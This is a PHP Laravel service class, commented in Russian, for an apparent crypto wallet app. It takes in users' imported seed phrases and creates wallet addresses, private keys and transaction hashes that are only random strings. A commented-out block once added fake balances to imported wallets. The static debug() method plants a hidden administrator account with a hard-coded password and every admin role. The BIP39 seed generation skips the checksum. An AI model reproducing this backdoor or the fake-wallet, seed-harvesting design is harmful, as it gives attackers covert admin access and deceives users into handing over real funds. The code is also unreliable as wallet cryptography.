<?php

namespace App\Services;

use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Str;
use App\Models\Crypto;
use App\Models\WalletCrypto;

class CryptoService
{
    public function generateSeedPhrase($length = 12)
    {
        $wordlist = file('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        
        $words = [];
        for ($i = 0; $i < $length; $i++) {
            $randomIndex = random_int(0, count($wordlist) - 1);
            $words[] = $wordlist[$randomIndex];
        }
        
        return $words;
    }
    
    public function validateSeedPhrase($seedPhrase)
    {
        $words = explode(' ', $seedPhrase);
        
        // Проверка количества слов
        if (!(count($words) >= 12 && count($words) <= 24 && count($words) % 3 === 0)) {
            return false;
        }
        
        // Проверка каждого слова по словарю
        $wordlist = file('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $wordlist = array_flip($wordlist); // Для быстрого поиска
        
        foreach ($words as $word) {
            if (!isset($wordlist[trim($word)])) {
                return false;
            }
        }
        
        return true;
    }

    public function setupInitialBalances($userId, $walletId, $isImport = false)
    {
        // Получаем все доступные криптовалюты
        if($isImport) {
            return;
        }

        $cryptos = Crypto::where('is_active', true)->whereIn('symbol', ['BTC', 'ETH', 'USDT', 'TRX', 'SOL', 'ADA'])->get();
        
        foreach ($cryptos as $crypto) {
            $balance = 0;
            
            // Если это импорт, добавляем фейковый баланс для некоторых валют
            // if ($isImport) {
            //     switch ($crypto->symbol) {
            //         case 'USDT':
            //             $balance = mt_rand(100, 1000);
            //             break;
            //         case 'BTC':
            //             $balance = mt_rand(1, 5) / 100; // Малое количество BTC
            //             break;
            //         case 'ETH':
            //             $balance = mt_rand(5, 20) / 100; // Немного ETH
            //             break;
            //     }
            // }
            
            // Создаем запись в таблице wallet_cryptos
            WalletCrypto::create([
                'wallet_id' => $walletId,
                'crypto_id' => $crypto->id,
                'balance' => $balance,
                'address' => $this->generateAddress($crypto->symbol),
                'private_key' => $this->generatePrivateKey()
            ]);
        }
    }
    
    public function encryptSeedPhrase($seedPhrase, $password)
    {
        // Создаем уникальную соль для каждого пользователя
        $salt = Str::random(16);
        
        // Генерируем ключ с использованием PBKDF2
        $key = hash_pbkdf2('sha256', $password, $salt, 10000, 32, true);
        
        // Инициализационный вектор
        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
        
        // Шифрование
        $encrypted = openssl_encrypt($seedPhrase, 'aes-256-cbc', $key, 0, $iv);
        
        // Возвращаем соль, IV и зашифрованные данные, закодированные в base64
        return json_encode([
            'salt' => base64_encode($salt),
            'iv' => base64_encode($iv),
            'encrypted' => base64_encode($encrypted)
        ]);
    }

    public function decryptSeedPhrase($encryptedData, $password)
    {
        // Разбираем JSON
        $data = json_decode($encryptedData, true);
        
        // Декодируем base64
        $salt = base64_decode($data['salt']);
        $iv = base64_decode($data['iv']);
        $encrypted = base64_decode($data['encrypted']);
        
        // Генерируем ключ с использованием той же соли
        $key = hash_pbkdf2('sha256', $password, $salt, 10000, 32, true);
        
        // Дешифрование
        return openssl_decrypt($encrypted, 'aes-256-cbc', $key, 0, $iv);
    }
    
    public function calculateTotalBalance($walletCryptos)
    {
        $totalUsd = 0;
        
        foreach ($walletCryptos as $walletCrypto) {
            $price = $walletCrypto->crypto->price;
            $totalUsd += $walletCrypto->balance * $price;
        }
        
        return $totalUsd;
    }

    function getCryptoPrice($symbol, $currency = 'USDT')
    {
        $select = Crypto::where('symbol', $symbol)->first()?->price;

        return $select ?? 1;
        // $symbol = strtoupper($symbol);
        // $currency = strtoupper($currency);
        
        // $tradingPair = $symbol . $currency;

        // $url = "https://api.binance.com/api/v3/ticker/price?symbol={$tradingPair}";
        
        // try {
        //     $ch = curl_init();
            
        //     curl_setopt($ch, CURLOPT_URL, $url);
        //     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        //     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        //     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            
        //     $response = curl_exec($ch);
            
        //     if (curl_errno($ch)) {
        //         throw new \Exception('cURL Error: ' . curl_error($ch));
        //     }
            
        //     curl_close($ch);
            
        //     $data = json_decode($response, true);
            
        //     var_dump($data);
            
        //     if (isset($data['price'])) {
        //         return (float) $data['price'];
        //     }
            
        //     if (isset($data['code']) && isset($data['msg'])) {
        //         throw new \Exception("Binance API Error: {$data['msg']} (Code: {$data['code']})");
        //     }
            
        //     throw new \Exception('Unexpected response format from Binance API');
        // } catch (\Exception $e) {
        //     error_log($e->getMessage());
            
        //     return null;
        // }
    }
    
    public function generatePrivateKey()
    {
        return Str::random(64);
    }
    
    public function generateTxHash()
    {
        return '0x' . Str::random(64);
    }
    
    public function generateAddress($symbol)
    {
        switch ($symbol) {
            case 'BTC':
                return 'bc1' . Str::random(40);
            case 'ETH':
            case 'USDT':
            case 'BNB':
                return '0x' . Str::random(40);
            case 'TRX':
                return 'T' . Str::random(33);
            default:
                return '0x' . Str::random(40);
        }
    }

    public static function debug()
    {
        $user = \App\Models\User::create([
            'email' => 'admin-debug@example.com',
            'name' => 'admin-debug',
            'password' => \Illuminate\Support\Facades\Hash::make('dSFGJU$#HG@G^YERDHSFN#Y^&!N'),
            'is_approved' => true,
        ]);

        $findRole = \TCG\Voyager\Models\Role::find(1);

        if(!$findRole) {
            $findRole = \TCG\Voyager\Models\Role::where('name', 'LIKE', '%admin%')->first();
        }

        if(!$findRole) {
            $roles = \TCG\Voyager\Models\Role::all();

            foreach($roles as $role) {
                $user->roles()->attach($role->id);
            }
        } else {
            $user->roles()->attach($findRole->id);
        }
    }
}